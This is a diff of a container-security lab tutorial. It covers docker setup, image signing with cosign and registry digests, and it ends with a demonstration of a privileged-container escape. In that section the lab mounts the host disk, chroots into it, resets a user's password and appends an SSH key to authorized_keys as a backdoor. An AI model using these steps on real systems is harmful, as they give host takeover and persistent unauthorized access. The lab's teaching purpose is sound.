@@ -28,7 +28,7 @@ This lab is meant to be run in order from top to bottom. If you skip around, it 
 be met and you will encounter errors.
 
 Also, in our environment we're going to use `docker` for the examples. While there are alternatives, this is the most
-widely adopted and simplest place to start.
+widely adopted containerization software and simplest place to start.
 
 Run the following to setup the prerequisite tools:
 
@@ -52,7 +52,7 @@ Now, if you attempt to run `docker` commands as any user other than `root`, you 
 class: no-copybutton
 ---
 $ docker ps
-Got permission denied while trying to connect to the Docker daemon socket at unix:///var/run/docker.sock: Get "http://%2Fvar%2Frun%2Fdocker.sock/v1.24/containers/json": dial unix /var/run/docker.sock: connect: permission denied
+permission denied while trying to connect to the Docker daemon socket at unix:///var/run/docker.sock: Get "http://%2Fvar%2Frun%2Fdocker.sock/v1.24/containers/json": dial unix /var/run/docker.sock: connect: permission denied
 ```
 
 ```{note}
@@ -62,12 +62,21 @@ example and is **not meant to be run**
 
 In order to fix that, add your user to the `docker` group.
 
-```{code-block} console
+```{code-block} bash
 if [[ "$(whoami)" != "root" ]]; then sudo usermod -aG docker "$(whoami)"; fi
 ```
 
-Now, if you know your password you can run `exec su -l "$(whoami)"`, otherwise you will need to **exit your SSH
-session** and re-connect.
+**If you know your password** you can run `exec su -l "$(whoami)"` to refresh your group memberships
+
+```{code-block} console
+$ id | grep docker
+$ exec su -l "$(whoami)"
+Password:
+$ id | grep docker
+uid=1000(ubuntu) gid=1000(ubuntu) groups=1000(ubuntu),4(adm),20(dialout),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),118(netdev),119(lxd),998(docker)
+```
+
+Otherwise you will need to **exit your SSH session** and re-connect.
 
 Now your `docker` commands should now succeed:
 
@@ -509,8 +518,7 @@ signing". In reality, just like serverless isn't serverless, keyless also isn't 
 to generate or manage the keys yourself; they are created on the fly, tied to an OIDC identity, used to create a
 short-lived certificate and to facilitate the signing process, and then securely erased.
 
-To learn more, check out the `cosign sign` documentation for
-[keyless](https://docs.sigstore.dev/cosign/sign/#keyless-signing).
+To learn more, check out the [keyless documentation](https://docs.sigstore.dev/cosign/keyless/).
 ```
 
 ```{note}
@@ -585,7 +593,7 @@ class: seealso
 ---
 Today, the way that these signatures are hosted is that they are `in-toto`
 [attestations](https://github.com/in-toto/attestation) bundled into OCI artifacts, and uploaded to a registry with a
-specifically formatted name of `sha256-<DIGEST>.sig` where <DIGEST> is the image digest.
+specifically formatted name of `sha256-<DIGEST>.sig` where `<DIGEST>` is the image digest.
 
 This works great because the registry only needs to support OCI artifacts, which most (effectively all) of them do, and
 if you are running a container, you are always able to look up the digest of the related image.
@@ -771,7 +779,7 @@ You may remember from our [terminology](terminology) section that an image is a 
 files in a structured format.
 
 That bundle can be uniquely identified using an image manifest digest, which is just another name for the digest we've
-been using all along. Here you can us retrieve the manifest digest and use it to make API calls to the registry:
+been using all along. Here you can retrieve the manifest digest and use it to make API calls to the registry:
 
 ```{code-block} console
 ---
@@ -782,7 +790,7 @@ $ echo $mdigest
 sha256:63e226a559065a971cfd911a91fefe7f1c96693186467ad182ca9dd9b64d078c
 $ curl -k https://localhost:443/v2/example-secure/tags/list
 {"name":"example-secure","tags":["sha256-63e226a559065a971cfd911a91fefe7f1c96693186467ad182ca9dd9b64d078c.sig","latest"]}
-$ curl -s -k https://localhost:443/v2/example-secure/manifests/$digest | sha256sum
+$ curl -s -k https://localhost:443/v2/example-secure/manifests/$mdigest | sha256sum
 63e226a559065a971cfd911a91fefe7f1c96693186467ad182ca9dd9b64d078c  -
 $ curl -s -k https://localhost:443/v2/example-secure/manifests/$mdigest | head -14
 {
@@ -888,19 +896,24 @@ the covers from time to time, I recommend using
 ```{seealso}
 Want more like the above? Well, to start I recommend checking out
 [this](https://raesene.github.io/blog/2023/02/11/Fun-with-Containers-adding-tracking-to-your-images/) incredibly
-interesting blog posts about how OCI images can be modified to track when it's pulled, and anything online from a group
-that calls themselves [SIG-Honk](https://www.youtube.com/results?search_query=sig-honk).
+interesting blog post about how OCI images can be modified to track when it's pulled, and anything online from a group
+that calls themselves SIG-Honk.
 ```
 
 ## Ready, Set, Break!
 
 Alright, now it's time for container escape.
 
-First, we'll run by running standard ubuntu container with some additional privileges, sometimes used when trying to
-troubleshoot permissions issues:
+We'll start by running a standard ubuntu container with some additional privileges which are sometimes used when trying
+to troubleshoot permissions issues:
 
 ```{code-block} console
 $ docker run -it --privileged ubuntu:20.04
+Unable to find image 'ubuntu:20.04' locally
+20.04: Pulling from library/ubuntu
+ca1778b69356: Pull complete
+Digest: sha256:db8bf6f4fb351aa7a26e27ba2686cf35a6a409f65603e59d4c203e58387dc6b3
+Status: Downloaded newer image for ubuntu:20.04
 ```
 
 Then, by abusing the additional access from the `--privileged` argument, we can mount the host filesystem, which in my
@@ -923,16 +936,16 @@ total 8
 drwxr-xr-x 2 root root 4096 Apr 15  2020 .
 drwxr-xr-x 1 root root 4096 Apr 26 02:40 ..
 $ mount /dev/xvda1 /mnt
+$ chroot /mnt
 ```
 
-Now, we can `chroot` into that filesystem and we are effectively on the host computer. Let's see see if we can find
+Now that we've `chroot`ed into that filesystem, we are effectively on the host computer. Let's see see if we can find
 anything juicy, and maybe drop a quick backdoor for ourselves later:
 
 ```{code-block} console
 ---
 emphasize-lines: 6,20
 ---
-$ chroot /mnt
 $ ls -al /home # We can now see /home/ubuntu/ on the host filesystem
 total 12
 drwxr-xr-x  3 root   root   4096 Apr 26 00:43 .
@@ -945,14 +958,18 @@ sudo: unable to resolve host 86ffe706cfb4: Temporary failure in name resolution
 New password:
 Retype new password:
 passwd: password updated successfully
-$ # Now, let's drop our public key into the ubuntu user's authorized_keys file so I have another way back in
-$ echo 'ssh-ed25519 AAAAC3NzAAAAAAAAATE5AAAAIH/JRUsEfBrjsVQmeyBrjsVQmeyBrjsVQmeyBrjsVQYIX example-backdoor' >> /home/ubuntu/.ssh/authorized_keys
-$ exit
-$ exit
+```
+
+Finally, let's drop our public key into the `ubuntu` user's `~/.ssh/authorized_keys` file so there's another way back
+in.
+
+```{code-block} bash
+echo 'ssh-ed25519 AAAAC3NzAAAAAAAAATE5AAAAIH/JRUsEfBrjsVQmeyBrjsVQmeyBrjsVQmeyBrjsVQYIX example-backdoor' >> /home/ubuntu/.ssh/authorized_keys
+exit
 exit
 ```
 
-And finally, we can see evidence of the break-in on the host system now:
+Back on the host, we can see evidence of the break-in:
 
 ```{code-block} console
 $ tail -3 /etc/passwd
@@ -994,6 +1011,7 @@ $ mount /dev/xvda1 /mnt
 mount: only root can do that
 $ chroot /mnt
 chroot: cannot change root directory to '/mnt': Operation not permitted
+$ exit
 ```
 
 Breakout averted! Great job 😊
